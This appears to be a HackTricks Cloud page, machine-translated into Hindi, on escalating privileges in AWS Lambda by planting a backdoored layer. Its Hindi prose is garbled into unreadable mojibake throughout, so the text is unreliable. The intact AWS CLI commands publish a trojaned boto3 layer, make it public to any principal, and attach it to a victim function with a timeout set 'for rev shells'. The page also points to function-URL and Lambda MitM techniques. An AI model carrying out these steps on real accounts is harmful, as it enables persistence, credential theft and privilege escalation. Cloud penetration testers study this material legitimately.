рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк `lambda:UpdateFunctionConfiguration` рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реИрдореНрдмрдбрд╛ рдХрд╛рд░реНрдп рдХреЛ рдПрдХ рдирдИ рдкрд░рдд рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдкрд░рдд рдореЗрдВ рдЕрджреНрд╡рд┐рддреАрдп рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдЬрд░реВрд░реА рд╣реИ рдХрд┐ рдпрд╣ рдкрд░рдд рдХреБрдЫ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗ рдЬрд┐рд╕реЗ рд▓реИрдореНрдмрдбрд╛ рдЖрдпрд╛рдд рдХрд░реЗрдЧрд╛ред рдпрджрд┐ рдЖрдк рд▓реИрдореНрдмрдбрд╛ рдХреЗ рдХреЛрдб рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд▓реИрдореНрдмрдбрд╛ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рдкрд░рдд рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░ рд░рд╣реА рд╣реЛ рдФрд░ рдЖрдк **рдкрд░рдд рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд╣рд╛рдВ **рдЕрдкрдирд╛ рдХреЛрдб рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдорд╛рди рд▓реЗрдВ рдХрд┐ рд▓реИрдореНрдмрдбрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп boto3 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ, рддреЛ рдпрд╣ рд▓рд╛рд╕реНрдЯ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рд╕рд╛рде рд╕реНрдерд╛рдиреАрдп рдкрд░рдд рдмрдирд╛рдПрдЧрд╛:
```
pip3 install -t ./lambda_layer boto3
```
рдЖрдк `./lambda_layer/boto3/__init__.py` рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╡реИрд╢реНрд╡рд┐рдХ рдХреЛрдб рдореЗрдВ рдмреИрдХрдбреЛрд░ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ** (рдорд╛рдирдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдпрд╛ рдЙрд▓реНрдЯрд╛ рдЦреЛрд▓ рд▓реЗрдиреЗ рдЬреИрд╕рд╛ рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рдиред)

рдлрд┐рд░, рдЙрд╕ `./lambda_layer` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдЬрд╝рд┐рдк рдХрд░реЗрдВ рдФрд░ рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдореЗрдВ рдирдИ рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░ **рдЕрдкрд▓реЛрдб** рдХрд░реЗрдВ (рдпрд╛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рдореЗрдВ, рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИ)ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреЛ /opt/python/boto3 рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╛рдпрдерди рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЙрд╕рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдбрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд▓реЗрдореНрдмрдбрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкрд╛рдпрдерди рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд╕рд╛рде **рд╕рдВрдЧрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** рдФрд░ рдпрджрд┐ рдЖрдк рдЗрд╕реЗ рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ **рд╡рд╣реА рдХреНрд╖реЗрддреНрд░ рдореЗрдВ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

рдЕрдм, рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░ **рдХрд┐рд╕реА рднреА рдЦрд╛рддреЗ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп** рдмрдирд╛рдПрдВ:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
рдФрд░ рд╡рд┐рдХреНрдЯрд┐рдо рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рдХреЛ рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░ рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдВ:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
рдЕрдЧрд▓рд╛ рдХрджрдо рд╣реЛрдЧрд╛ рдпрд╛ рддреЛ **рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдирд╛** рдЕрдЧрд░ рд╣рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдлрд┐рд░ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрдм рддрдХ рдпрд╣ **рд╕рд╛рдорд╛рдиреНрдп рдорд╛рдзреНрдпрдореЛрдВ рджреНрд╡рд╛рд░рд╛ рдЖрдордВрддреНрд░рд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛** - рдЬреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХрд╛ рд╣реИред

рдЗрд╕ рд╡реНрдпрдХреНрддрд┐рдЧрдд рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдо рдХреЛ рд╢рд╛рдпрдж **рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдзрд┐рдХ рдЫрд┐рдкрдХрд▓реА рддрд░реАрдХрд╛** рдЗрд╕рдореЗрдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЛ рд╕реАрдзреЗ рдЙрдиреНрдирдд рдХрд░рдирд╛ред

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

рд╢рд╛рдпрдж рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ URL рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ... рд▓реЗрдХрд┐рди рдореИрдВ рдЗрд╕реЗ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдвреВрдВрдврд╝ рд╕рдХрддрд╛ рд╣реВрдБ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рддреЛ рдореБрдЭреЗ рдмрддрд╛рдПрдВ!

### рд▓реИрдореНрдмрдбрд╛ MitM

рдХреБрдЫ рд▓реИрдореНрдмрдбрд╛ **рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣реЗ рд╣реЛрдВрдЧреЗред** рдпрджрд┐ рдЙрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдореЗрдВ RCE рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕рдореЗрдВ рднреЗрдЬреА рдЬрд╛ рд░рд╣реА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рдЬрд╛рдВрдЪреЗрдВ:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **рдкрд░** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ **HackTricks** рдФрд░ **HackTricks Cloud** github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
